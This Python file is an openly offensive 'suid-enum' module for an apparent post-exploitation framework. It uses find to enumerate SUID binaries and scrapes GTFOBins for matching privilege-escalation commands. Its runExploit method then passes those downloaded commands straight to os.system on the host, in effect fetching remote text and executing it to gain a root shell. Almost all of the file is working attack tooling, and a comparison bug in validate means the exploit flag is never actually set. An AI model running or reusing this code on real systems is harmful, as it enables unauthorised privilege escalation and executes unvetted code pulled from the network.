# Libraries
# ---------
# 2 libraries to find them all
import os
import subprocess
# 2 libraries to scrape them all
import requests
from bs4 import BeautifulSoup
# 1 library to make things colourful
from termcolor import colored
# And in the darkness pwn them

# *cough* oh and these  *cough*
import re, sys


class SuidEnum(BaseModule):
    def __init__(self):
        BaseModule.__init__(self)
        self.name = "suid-enum"
        self.url = "https://gtfobins.github.io/gtfobins/"
        # define attributes and set initial values
        self.attr['exploit'] = False
    
    def usage(self):
        print("When I can be arsed I will add some usage information for this module here")

    def validate(self, attr, val):
        if attr == 'exploit':
            if val.lower() == 'true':
                self.attr['exploit'] == True
                return True
            elif val.lower() == 'false':
                self.attr['exploit'] == False
                return True
            else:
                print(f'Invalid value for attribute {attr}')
                return False
        else:
            print(f'Attribute {attr} does not exist')
            return False

    def run(self):
        bins,_ = self.findSuid()
        for bin_ in bins:
            exploit = self.scrapeGTFOBins(bin_)
            if self.attr['exploit'] and exploit != None:
                self.runExploit(exploit)
        return True

    def findSuid(self):
        """ This method searches for suid  binaries on the current file system. It currently uses 
            find and stores the result in a temp file, this need to be fixed"""
        print('[*] Scanning file system for suid binaries')
        paths = []
        bins = []
        temp_file = subprocess.check_output("mktemp",shell=True).decode('utf-8')[:-1]
        cmd1 = f"find / -type f -perm -u=s 2>/dev/null | tee {temp_file}"
        cmd2 = f"cat {temp_file} | rev | cut -f 1 -d \"/\" | rev"
        # find outputs a non zero return value if not run as root command still works however
        # The try except is just so that python doesn't error out
        #try:
        paths = subprocess.getoutput(cmd1).split('\n')[:-1]
        bins =  subprocess.check_output(cmd2,shell=True).decode('utf-8').split('\n')[:-1]
        #except subprocess.CalledProcessError:
        #    pass
        return bins, dict(zip(bins,paths))

    def scrapeGTFOBins(self,bin_):
        page = requests.get(self.url+bin_)
        if page.status_code == 200:
            try:
                content = page.content.decode('utf-8').split('<h2 id="suid" class="function-name">SUID</h2>')[1]
                soup = BeautifulSoup(content, 'html.parser')
                exploit = str(soup.find('pre').find('code').text)
                print(colored(f"[!] Dope!!! {bin_} has an exploit, go fourth and pwn my child: ", 'red'))
                print(exploit)
                return exploit
            except:
                print(colored(f"[*] {bin_} is on GTFO bins but no suid I'm afraid :(", 'yellow'))
        else:
            print(colored(f"[*] {bin_} has it's suid bit set but it's not got an exploit on GTFOBins", 'blue'))
    
    def runExploit(self, exploit):
        print(colored(f"[!] Giving it a try now, praise the turtle god and may be you blessed with all the shells", 'red'))
        for i,cmd in enumerate(exploit.split('\n')):
            if i!=0:
                cmd = re.sub('^./','',cmd)
                os.system(cmd)

self.loaded_modules['suid-enum'] = SuidEnum()
